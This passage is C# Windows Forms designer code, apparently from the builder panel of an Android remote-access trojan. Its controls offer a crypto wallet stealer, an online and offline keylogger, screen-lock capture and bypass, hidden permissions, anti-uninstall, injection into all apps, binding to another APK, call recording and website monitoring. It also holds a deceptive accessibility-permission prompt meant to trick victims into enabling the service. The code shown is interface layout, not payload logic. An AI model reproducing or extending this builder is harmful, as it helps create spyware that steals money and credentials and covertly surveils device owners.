		this.cusomupdateimg.TabStop = false;
		this.trgtbkg.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.trgtbkg.FillColor = System.Drawing.Color.Black;
		this.trgtbkg.Font = new System.Drawing.Font("Calibri", 12f);
		this.trgtbkg.ForeColor = System.Drawing.Color.SkyBlue;
		this.trgtbkg.Location = new System.Drawing.Point(748, 48);
		this.trgtbkg.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.trgtbkg.Maximum = 2147483647.0;
		this.trgtbkg.Minimum = -2147483648.0;
		this.trgtbkg.Name = "trgtbkg";
		this.trgtbkg.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.trgtbkg.Radius = 10;
		this.trgtbkg.RectColor = System.Drawing.Color.SkyBlue;
		this.trgtbkg.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.trgtbkg.Size = new System.Drawing.Size(231, 27);
		this.trgtbkg.Style = DrakeUI.Framework.UIStyle.Custom;
		this.trgtbkg.TabIndex = 93;
		this.trgtbkg.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.trgtbkg.Watermark = "Binded ApK Name";
		this.Label41.AutoSize = true;
		this.Label41.BackColor = System.Drawing.Color.Transparent;
		this.Label41.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label41.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label41.Location = new System.Drawing.Point(55, 340);
		this.Label41.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label41.Name = "Label41";
		this.Label41.Size = new System.Drawing.Size(16, 19);
		this.Label41.TabIndex = 92;
		this.Label41.Text = "*";
		this.checkkeepsscreen.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkkeepsscreen.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkkeepsscreen.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkkeepsscreen.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkkeepsscreen.Location = new System.Drawing.Point(83, 340);
		this.checkkeepsscreen.Name = "checkkeepsscreen";
		this.checkkeepsscreen.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkkeepsscreen.Size = new System.Drawing.Size(338, 29);
		this.checkkeepsscreen.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkkeepsscreen.TabIndex = 91;
		this.checkkeepsscreen.Text = "Screen Lock Capture And Bypass";
		this.CheckHidePrims.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckHidePrims.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckHidePrims.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckHidePrims.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckHidePrims.Location = new System.Drawing.Point(83, 375);
		this.CheckHidePrims.Name = "CheckHidePrims";
		this.CheckHidePrims.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckHidePrims.Size = new System.Drawing.Size(338, 29);
		this.CheckHidePrims.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckHidePrims.TabIndex = 89;
		this.CheckHidePrims.Text = "Hide All Screen Permissions";
		this.Label38.AutoSize = true;
		this.Label38.BackColor = System.Drawing.Color.Transparent;
		this.Label38.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label38.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label38.Location = new System.Drawing.Point(55, 375);
		this.Label38.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label38.Name = "Label38";
		this.Label38.Size = new System.Drawing.Size(16, 19);
		this.Label38.TabIndex = 88;
		this.Label38.Text = "*";
		this.checkadmin.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkadmin.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkadmin.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkadmin.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkadmin.Location = new System.Drawing.Point(83, 235);
		this.checkadmin.Name = "checkadmin";
		this.checkadmin.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkadmin.Size = new System.Drawing.Size(338, 29);
		this.checkadmin.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkadmin.TabIndex = 86;
		this.checkadmin.Text = "Ask Request Admin";
		this.checkautostart.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkautostart.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkautostart.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkautostart.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkautostart.Location = new System.Drawing.Point(83, 130);
		this.checkautostart.Name = "checkautostart";
		this.checkautostart.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkautostart.Size = new System.Drawing.Size(338, 29);
		this.checkautostart.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkautostart.TabIndex = 83;
		this.checkautostart.Text = "Crypto Wallet Stealer (USDT-BTC-ETH)";
		this.Label34.AutoSize = true;
		this.Label34.BackColor = System.Drawing.Color.Transparent;
		this.Label34.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label34.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label34.Location = new System.Drawing.Point(55, 130);
		this.Label34.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label34.Name = "Label34";
		this.Label34.Size = new System.Drawing.Size(16, 19);
		this.Label34.TabIndex = 82;
		this.Label34.Text = "*";
		this.Label43.AutoSize = true;
		this.Label43.BackColor = System.Drawing.Color.Transparent;
		this.Label43.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label43.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label43.Location = new System.Drawing.Point(45, 484);
		this.Label43.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label43.Name = "Label43";
		this.Label43.Size = new System.Drawing.Size(19, 24);
		this.Label43.TabIndex = 80;
		this.Label43.Text = "*";
		this.delayaccesstext.BackColor = System.Drawing.Color.FromArgb(34, 34, 34);
		this.delayaccesstext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.delayaccesstext.ForeColor = System.Drawing.Color.SkyBlue;
		this.delayaccesstext.Location = new System.Drawing.Point(79, 484);
		this.delayaccesstext.Margin = new System.Windows.Forms.Padding(4);
		this.delayaccesstext.Name = "delayaccesstext";
		this.delayaccesstext.Size = new System.Drawing.Size(37, 27);
		this.delayaccesstext.TabIndex = 79;
		this.delayaccesstext.Text = "30";
		this.delayaccesstext.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.delaylabelaccess.AutoSize = true;
		this.delaylabelaccess.BackColor = System.Drawing.Color.Transparent;
		this.delaylabelaccess.Font = new System.Drawing.Font("Calibri", 12f);
		this.delaylabelaccess.ForeColor = System.Drawing.Color.SkyBlue;
		this.delaylabelaccess.Location = new System.Drawing.Point(124, 491);
		this.delaylabelaccess.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.delaylabelaccess.Name = "delaylabelaccess";
		this.delaylabelaccess.Size = new System.Drawing.Size(271, 19);
		this.delaylabelaccess.TabIndex = 78;
		this.delaylabelaccess.Text = "Request Accessibility Service Selay (sec)";
		this.CheckBIND.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckBIND.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckBIND.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckBIND.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckBIND.Location = new System.Drawing.Point(602, 51);
		this.CheckBIND.Name = "CheckBIND";
		this.CheckBIND.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckBIND.Size = new System.Drawing.Size(138, 29);
		this.CheckBIND.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckBIND.TabIndex = 76;
		this.CheckBIND.Text = "Bind With Apk";
		this.CheckBIND.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.CheckDraw.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckDraw.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckDraw.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckDraw.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckDraw.Location = new System.Drawing.Point(83, 95);
		this.CheckDraw.Name = "CheckDraw";
		this.CheckDraw.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckDraw.Size = new System.Drawing.Size(338, 29);
		this.CheckDraw.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckDraw.TabIndex = 75;
		this.CheckDraw.Text = "Injection All Application";
		this.checkemo.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkemo.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkemo.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkemo.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkemo.Location = new System.Drawing.Point(83, 200);
		this.checkemo.Name = "checkemo";
		this.checkemo.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkemo.Size = new System.Drawing.Size(338, 29);
		this.checkemo.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkemo.TabIndex = 74;
		this.checkemo.Text = "Anti Uninstall Spreed Booster";
		this.Checksuper.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.Checksuper.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Checksuper.Font = new System.Drawing.Font("Calibri", 12f);
		this.Checksuper.ForeColor = System.Drawing.Color.SkyBlue;
		this.Checksuper.Location = new System.Drawing.Point(83, 270);
		this.Checksuper.Name = "Checksuper";
		this.Checksuper.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.Checksuper.Size = new System.Drawing.Size(338, 29);
		this.Checksuper.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Checksuper.TabIndex = 72;
		this.Checksuper.Text = "Screen Controller Super Mod";
		this.checkkeyloger.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkkeyloger.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkkeyloger.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkkeyloger.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkkeyloger.Location = new System.Drawing.Point(83, 305);
		this.checkkeyloger.Name = "checkkeyloger";
		this.checkkeyloger.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkkeyloger.Size = new System.Drawing.Size(338, 29);
		this.checkkeyloger.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkkeyloger.TabIndex = 71;
		this.checkkeyloger.Text = "Online And Offline Keylogger";
		this.CheckQuick.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckQuick.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckQuick.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckQuick.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckQuick.Location = new System.Drawing.Point(83, 60);
		this.CheckQuick.Name = "CheckQuick";
		this.CheckQuick.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckQuick.Size = new System.Drawing.Size(338, 29);
		this.CheckQuick.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckQuick.TabIndex = 70;
		this.CheckQuick.Text = "Accessibility Bypass Quick Install";
		this.Label35.AutoSize = true;
		this.Label35.BackColor = System.Drawing.Color.Transparent;
		this.Label35.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label35.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label35.Location = new System.Drawing.Point(55, 95);
		this.Label35.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label35.Name = "Label35";
		this.Label35.Size = new System.Drawing.Size(16, 19);
		this.Label35.TabIndex = 69;
		this.Label35.Text = "*";
		this.explaintoolstext.AcceptsTab = true;
		this.explaintoolstext.BackColor = System.Drawing.Color.Black;
		this.explaintoolstext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.explaintoolstext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.explaintoolstext.Font = new System.Drawing.Font("Calibri", 11f);
		this.explaintoolstext.ForeColor = System.Drawing.SystemColors.GradientActiveCaption;
		this.explaintoolstext.Location = new System.Drawing.Point(0, 539);
		this.explaintoolstext.Multiline = true;
		this.explaintoolstext.Name = "explaintoolstext";
		this.explaintoolstext.ReadOnly = true;
		this.explaintoolstext.Size = new System.Drawing.Size(1004, 138);
		this.explaintoolstext.TabIndex = 66;
		this.Label33.AutoSize = true;
		this.Label33.BackColor = System.Drawing.Color.Transparent;
		this.Label33.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label33.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label33.Location = new System.Drawing.Point(55, 59);
		this.Label33.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label33.Name = "Label33";
		this.Label33.Size = new System.Drawing.Size(16, 19);
		this.Label33.TabIndex = 65;
		this.Label33.Text = "*";
		this.Label17.AutoSize = true;
		this.Label17.BackColor = System.Drawing.Color.Transparent;
		this.Label17.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label17.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label17.Location = new System.Drawing.Point(574, 52);
		this.Label17.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label17.Name = "Label17";
		this.Label17.Size = new System.Drawing.Size(16, 19);
		this.Label17.TabIndex = 36;
		this.Label17.Text = "*";
		this.Label16.AutoSize = true;
		this.Label16.BackColor = System.Drawing.Color.Transparent;
		this.Label16.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label16.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label16.Location = new System.Drawing.Point(55, 200);
		this.Label16.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label16.Name = "Label16";
		this.Label16.Size = new System.Drawing.Size(16, 19);
		this.Label16.TabIndex = 57;
		this.Label16.Text = "*";
		this.Label14.AutoSize = true;
		this.Label14.BackColor = System.Drawing.Color.Transparent;
		this.Label14.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label14.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label14.Location = new System.Drawing.Point(55, 305);
		this.Label14.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label14.Name = "Label14";
		this.Label14.Size = new System.Drawing.Size(16, 19);
		this.Label14.TabIndex = 54;
		this.Label14.Text = "*";
		this.Label6.AutoSize = true;
		this.Label6.BackColor = System.Drawing.Color.Transparent;
		this.Label6.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label6.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label6.Location = new System.Drawing.Point(55, 270);
		this.Label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(16, 19);
		this.Label6.TabIndex = 51;
		this.Label6.Text = "*";
		this.CheckRecord.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckRecord.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckRecord.Enabled = false;
		this.CheckRecord.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckRecord.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckRecord.Location = new System.Drawing.Point(128, 605);
		this.CheckRecord.Name = "CheckRecord";
		this.CheckRecord.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckRecord.Size = new System.Drawing.Size(338, 29);
		this.CheckRecord.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckRecord.TabIndex = 73;
		this.CheckRecord.Text = "Record Calls";
		this.CheckRecord.Visible = false;
		this.TabPage12.BackColor = System.Drawing.Color.SkyBlue;
		this.TabPage12.Controls.Add(this.Panel6);
		this.TabPage12.Location = new System.Drawing.Point(0, 40);
		this.TabPage12.Name = "TabPage12";
		this.TabPage12.Size = new System.Drawing.Size(450, 230);
		this.TabPage12.TabIndex = 4;
		this.TabPage12.Text = "Login";
		this.Panel6.BackColor = System.Drawing.Color.Black;
		this.Panel6.Controls.Add(this.logbtntext);
		this.Panel6.Controls.Add(this.Label37);
		this.Panel6.Controls.Add(this.dscriptext);
		this.Panel6.Controls.Add(this.Label29);
		this.Panel6.Controls.Add(this.Label31);
		this.Panel6.Controls.Add(this.Label32);
		this.Panel6.Controls.Add(this.Button3);
		this.Panel6.Controls.Add(this.logbodytext);
		this.Panel6.Controls.Add(this.logtitletext);
		this.Panel6.Controls.Add(this.PictureBox2);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel6.Location = new System.Drawing.Point(0, 0);
		this.Panel6.Name = "Panel6";
		this.Panel6.Size = new System.Drawing.Size(450, 230);
		this.Panel6.TabIndex = 47;
		this.logbtntext.BackColor = System.Drawing.Color.Transparent;
		this.logbtntext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.logbtntext.FillColor = System.Drawing.Color.FromArgb(0, 39, 81);
		this.logbtntext.Font = new System.Drawing.Font("Calibri", 16f);
		this.logbtntext.ForeColor = System.Drawing.Color.White;
		this.logbtntext.Location = new System.Drawing.Point(479, 468);
		this.logbtntext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.logbtntext.Maximum = 2147483647.0;
		this.logbtntext.Minimum = -2147483648.0;
		this.logbtntext.Name = "logbtntext";
		this.logbtntext.Padding = new System.Windows.Forms.Padding(5);
		this.logbtntext.Radius = 15;
		this.logbtntext.RectColor = System.Drawing.Color.Transparent;
		this.logbtntext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.logbtntext.Size = new System.Drawing.Size(112, 34);
		this.logbtntext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.logbtntext.TabIndex = 48;
		this.logbtntext.Text = "Enable";
		this.logbtntext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Label37.AutoSize = true;
		this.Label37.BackColor = System.Drawing.Color.Transparent;
		this.Label37.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label37.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label37.Location = new System.Drawing.Point(23, 572);
		this.Label37.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label37.Name = "Label37";
		this.Label37.Size = new System.Drawing.Size(191, 24);
		this.Label37.TabIndex = 46;
		this.Label37.Text = "Settings Description >";
		this.dscriptext.Location = new System.Drawing.Point(290, 558);
		this.dscriptext.Multiline = true;
		this.dscriptext.Name = "dscriptext";
		this.dscriptext.Size = new System.Drawing.Size(493, 58);
		this.dscriptext.TabIndex = 45;
		this.dscriptext.Text = "this Permission is required to make the app work properly , Allow to continue";
		this.Label29.AutoSize = true;
		this.Label29.BackColor = System.Drawing.Color.Transparent;
		this.Label29.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label29.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label29.Location = new System.Drawing.Point(201, 33);
		this.Label29.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label29.Name = "Label29";
		this.Label29.Size = new System.Drawing.Size(62, 24);
		this.Label29.TabIndex = 36;
		this.Label29.Text = "Write Title >";
		this.Label31.AutoSize = true;
		this.Label31.BackColor = System.Drawing.Color.Transparent;
		this.Label31.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label31.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label31.Location = new System.Drawing.Point(88, 336);
		this.Label31.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label31.Name = "Label31";
		this.Label31.Size = new System.Drawing.Size(142, 24);
		this.Label31.TabIndex = 38;
		this.Label31.Text = "Write Message >";
		this.Label32.AutoSize = true;
		this.Label32.BackColor = System.Drawing.Color.Transparent;
		this.Label32.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label32.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label32.Location = new System.Drawing.Point(111, 477);
		this.Label32.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label32.Name = "Label32";
		this.Label32.Size = new System.Drawing.Size(121, 24);
		this.Label32.TabIndex = 40;
		this.Label32.Text = "Button Text >";
		this.Button3.BackColor = System.Drawing.Color.Black;
		this.Button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button3.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Button3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button3.Location = new System.Drawing.Point(815, 615);
		this.Button3.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Button3.Name = "Button3";
		this.Button3.Size = new System.Drawing.Size(180, 34);
		this.Button3.TabIndex = 44;
		this.Button3.Text = "Default";
		this.Button3.UseVisualStyleBackColor = false;
		this.logbodytext.BackColor = System.Drawing.Color.FromArgb(0, 39, 81);
		this.logbodytext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.logbodytext.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.logbodytext.ForeColor = System.Drawing.Color.SkyBlue;
		this.logbodytext.Location = new System.Drawing.Point(308, 311);
		this.logbodytext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.logbodytext.Multiline = true;
		this.logbodytext.Name = "logbodytext";
		this.logbodytext.Size = new System.Drawing.Size(452, 130);
		this.logbodytext.TabIndex = 37;
		this.logbodytext.Text = "This App Request Accessibility Service:\r\n• Click on Enable\r\n• Go to Downloaded Service\r\n• Enable [MY-NAME]";
		this.logbodytext.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.logtitletext.BackColor = System.Drawing.Color.FromArgb(38, 50, 56);
		this.logtitletext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.logtitletext.Font = new System.Drawing.Font("Calibri", 11f, System.Drawing.FontStyle.Bold);
		this.logtitletext.ForeColor = System.Drawing.Color.SkyBlue;
		this.logtitletext.Location = new System.Drawing.Point(355, 30);
		this.logtitletext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.logtitletext.Name = "logtitletext";
		this.logtitletext.Size = new System.Drawing.Size(182, 25);
		this.logtitletext.TabIndex = 35;
		this.logtitletext.Text = "Accessibility";
		this.PictureBox2.BackColor = System.Drawing.Color.Black;
		this.PictureBox2.Image = (System.Drawing.Image)resources.GetObject("PictureBox2.Image");
		this.PictureBox2.Location = new System.Drawing.Point(291, 27);
		this.PictureBox2.Margin = new System.Windows.Forms.Padding(4);
		this.PictureBox2.Name = "PictureBox2";
		this.PictureBox2.Size = new System.Drawing.Size(488, 513);
		this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox2.TabIndex = 34;
		this.PictureBox2.TabStop = false;
		this.TabPage13.BackColor = System.Drawing.Color.SkyBlue;
		this.TabPage13.Controls.Add(this.Panel7);
		this.TabPage13.Location = new System.Drawing.Point(0, 40);
		this.TabPage13.Name = "TabPage13";
		this.TabPage13.Size = new System.Drawing.Size(450, 230);
		this.TabPage13.TabIndex = 5;
		this.TabPage13.Text = "Monitor";
		this.Panel7.BackColor = System.Drawing.Color.Black;
		this.Panel7.Controls.Add(this.panelmonitorb);
		this.Panel7.Controls.Add(this.panemnitor);
		this.Panel7.Controls.Add(this.Panel10);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel7.Location = new System.Drawing.Point(0, 0);
		this.Panel7.Name = "Panel7";
		this.Panel7.Size = new System.Drawing.Size(450, 230);
		this.Panel7.TabIndex = 53;
		this.panelmonitorb.Controls.Add(this.explainmonitortext);
		this.panelmonitorb.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelmonitorb.Location = new System.Drawing.Point(0, 98);
		this.panelmonitorb.Name = "panelmonitorb";
		this.panelmonitorb.Size = new System.Drawing.Size(450, 132);
		this.panelmonitorb.TabIndex = 98;
		this.explainmonitortext.AcceptsTab = true;
		this.explainmonitortext.BackColor = System.Drawing.Color.Black;
		this.explainmonitortext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.explainmonitortext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.explainmonitortext.Font = new System.Drawing.Font("Calibri", 11f);
		this.explainmonitortext.ForeColor = System.Drawing.SystemColors.GradientActiveCaption;
		this.explainmonitortext.Location = new System.Drawing.Point(0, 0);
		this.explainmonitortext.Multiline = true;
		this.explainmonitortext.Name = "explainmonitortext";
		this.explainmonitortext.ReadOnly = true;
		this.explainmonitortext.Size = new System.Drawing.Size(450, 132);
		this.explainmonitortext.TabIndex = 67;
		this.panemnitor.Controls.Add(this.Label44);
		this.panemnitor.Controls.Add(this.Label42);
		this.panemnitor.Controls.Add(this.Label40);
		this.panemnitor.Controls.Add(this.Label36);
		this.panemnitor.Controls.Add(this.Label26);
		this.panemnitor.Controls.Add(this.removmonitor);
		this.panemnitor.Controls.Add(this.addmintor);
		this.panemnitor.Controls.Add(this.listmonitor);
		this.panemnitor.Controls.Add(this.namemonitor);
		this.panemnitor.Controls.Add(this.idmonitor);
		this.panemnitor.Controls.Add(this.linkmonitor);
		this.panemnitor.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panemnitor.Enabled = false;
		this.panemnitor.Location = new System.Drawing.Point(0, 119);
		this.panemnitor.Name = "panemnitor";
		this.panemnitor.Size = new System.Drawing.Size(450, 111);
		this.panemnitor.TabIndex = 97;
		this.Label44.AutoSize = true;
		this.Label44.BackColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Label44.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label44.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label44.Location = new System.Drawing.Point(124, 54);
		this.Label44.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label44.Name = "Label44";
		this.Label44.Size = new System.Drawing.Size(156, 24);
		this.Label44.TabIndex = 107;
		this.Label44.Text = "Add new website";
		this.Label42.AutoSize = true;
		this.Label42.BackColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Label42.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label42.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label42.Location = new System.Drawing.Point(455, 54);
		this.Label42.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label42.Name = "Label42";
		this.Label42.Size = new System.Drawing.Size(130, 24);
		this.Label42.TabIndex = 106;
		this.Label42.Text = "Monitored list";
		this.Label40.AutoSize = true;
		this.Label40.BackColor = System.Drawing.Color.Transparent;
		this.Label40.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label40.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label40.Location = new System.Drawing.Point(57, 323);
		this.Label40.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label40.Name = "Label40";
		this.Label40.Size = new System.Drawing.Size(16, 19);
		this.Label40.TabIndex = 105;
		this.Label40.Text = "*";
		this.Label36.AutoSize = true;
		this.Label36.BackColor = System.Drawing.Color.Transparent;
		this.Label36.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label36.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label36.Location = new System.Drawing.Point(57, 235);
		this.Label36.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label36.Name = "Label36";
		this.Label36.Size = new System.Drawing.Size(16, 19);
		this.Label36.TabIndex = 104;
		this.Label36.Text = "*";
		this.Label26.AutoSize = true;
		this.Label26.BackColor = System.Drawing.Color.Transparent;
		this.Label26.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label26.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label26.Location = new System.Drawing.Point(57, 147);
		this.Label26.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label26.Name = "Label26";
		this.Label26.Size = new System.Drawing.Size(16, 19);
		this.Label26.TabIndex = 103;
		this.Label26.Text = "*";
		this.removmonitor.AvatarSize = 30;
		this.removmonitor.BackColor = System.Drawing.Color.Transparent;
		this.removmonitor.Cursor = System.Windows.Forms.Cursors.Hand;
		this.removmonitor.FillColor = System.Drawing.Color.Transparent;
		this.removmonitor.Font = new System.Drawing.Font("Calibri", 12f);
		this.removmonitor.ForeColor = System.Drawing.Color.SkyBlue;
